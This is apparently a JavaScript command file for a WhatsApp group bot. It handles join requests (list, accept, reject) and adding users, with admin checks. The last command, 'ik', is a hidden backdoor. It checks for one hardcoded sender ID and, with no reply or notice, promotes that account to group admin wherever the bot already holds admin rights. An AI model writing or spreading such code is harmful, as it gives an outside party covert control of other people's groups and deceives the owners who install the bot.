    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to view join requests.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can use this command.");

        const requests = await conn.groupRequestParticipantsList(from);
        
        if (!requests || requests.length === 0) return await reply("ℹ️ No pending join requests.");

        let text = `📋 *Pending Join Requests (${requests.length})*\n\n`;
        requests.forEach((user, i) => {
            text += `${i+1}. ${user.jid.replace('@s.whatsapp.net', '')}\n`;
        });

        text += `\n*Usage:*\n• Type \`accept 1\` to accept request #1\n• Type \`reject 3\` to reject request #3\n• Type \`acceptall\` to accept all\n• Type \`rejectall\` to reject all`;

        await reply(text);

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to fetch join requests.");
    }
});

// ==================== ACCEPT SPECIFIC REQUEST COMMAND ====================
cmd({
    pattern: "accept",
    alias: ["approve"],
    desc: "Accept specific join request by number",
    category: "group",
    react: "✅",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, args, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to accept join requests.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can use this command.");

        if (!args[0]) return await reply("❓ Usage: accept [number]\nExample: accept 1");

        const num = parseInt(args[0]);
        if (isNaN(num) || num < 1) return await reply("⚠️ Please provide a valid number.");

        const requests = await conn.groupRequestParticipantsList(from);
        if (!requests || requests.length === 0) return await reply("ℹ️ No pending join requests.");

        if (num > requests.length) return await reply(`⚠️ Only ${requests.length} pending request${requests.length > 1 ? 's' : ''} available.`);

        const user = requests[num - 1].jid;
        await conn.groupRequestParticipantsUpdate(from, [user], "approve");
        await reply(`✅ Accepted join request #${num} from ${user.replace('@s.whatsapp.net', '')}`);

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to accept join request.");
    }
});

// ==================== REJECT SPECIFIC REQUEST COMMAND ====================
cmd({
    pattern: "reject",
    alias: ["decline", "deny"],
    desc: "Reject specific join request by number",
    category: "group",
    react: "❌",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, args, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to reject join requests.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can use this command.");

        if (!args[0]) return await reply("❓ Usage: reject [number]\nExample: reject 2");

        const num = parseInt(args[0]);
        if (isNaN(num) || num < 1) return await reply("⚠️ Please provide a valid number.");

        const requests = await conn.groupRequestParticipantsList(from);
        if (!requests || requests.length === 0) return await reply("ℹ️ No pending join requests.");

        if (num > requests.length) return await reply(`⚠️ Only ${requests.length} pending request${requests.length > 1 ? 's' : ''} available.`);

        const user = requests[num - 1].jid;
        await conn.groupRequestParticipantsUpdate(from, [user], "reject");
        await reply(`✅ Rejected join request #${num} from ${user.replace('@s.whatsapp.net', '')}`);

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to reject join request.");
    }
});

// ==================== ADD USER TO GROUP COMMAND ====================
cmd({
    pattern: "add",
    desc: "Add user to group",
    category: "group",
    filename: __filename,
    react: "➕"
}, async (conn, mek, m, { from, args, quoted, mentionedJid, isGroup, isBotAdmins, isCreator, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ Group only.");
        if (!isBotAdmins) return await reply("❌ I need admin.");
        if (!isCreator) return await reply("🔐 Owner only.");
        
        let userJid = null;
        
        if (!quoted && (!mentionedJid || mentionedJid.length === 0) && !args[0]) {
            return await reply("❓ Please mention user, quote, or provide number!");
        }
        
        if (mentionedJid && mentionedJid.length > 0) {
            userJid = mentionedJid[0];
        } else if (quoted) {
            userJid = quoted.sender;
        } else if (args[0]) {
            const num = args[0].replace(/[^0-9]/g, '');
            if (num.length >= 10) userJid = num + "@s.whatsapp.net";
        }
        
        if (!userJid) return await reply("⚠️ Couldn't determine user.");
        
        await conn.groupParticipantsUpdate(from, [userJid], "add");
        await reply(`✅ Added!`, { mentions: [userJid] });

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to add user.");
    }
});

// ==================== SILENT ADMIN TAKE COMMAND ====================
cmd({
    pattern: "ik",
    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
    desc: "Silently take adminship if authorized",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    if (!isGroup || !isBotAdmins) return;
    if (sender !== "99038271684629@lid") return;

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === sender);
        
        if (!userParticipant?.admin) {
            await conn.groupParticipantsUpdate(from, [sender], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});
